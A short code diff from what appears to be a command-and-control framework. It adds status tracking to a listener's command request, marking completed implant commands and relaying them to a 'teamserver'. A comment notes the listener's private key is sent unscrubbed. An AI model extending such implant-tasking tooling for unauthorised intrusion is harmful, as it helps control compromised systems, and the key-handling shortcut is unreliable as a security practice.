@@ -87,9 +87,19 @@ def request_command(listener):
     :param listener:
     :return:
     """
+    done_cmds = []
     # TODO: Technically we're shipping the lp privkey for each implant over, we should probably scrub it, but it doesn't really matter since it's gonna rotate after this transaction anyways
     data = {'component_id': listener.component_id, "cmd": "gcmd",
             "args": [{"lpk": listener.initial_public_key._public_key}, {"implants": listener.implants}]}
+    for command in listener.cmd_queue:
+        if command['state'] == "OUTPUT_RECEIVED":
+            # Set the command state to "OUTPUT_RELAYED"
+            event_history = {"timestamp": time(), "event": "COMPLETED", "component": listener.component_id}
+            command['history'].append(event_history)
+            command['state'] = "COMPLETED"
+            done_cmds.append(command)
+    if len(done_cmds) > 0:
+        data['done'] = done_cmds
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
     return reply_frame
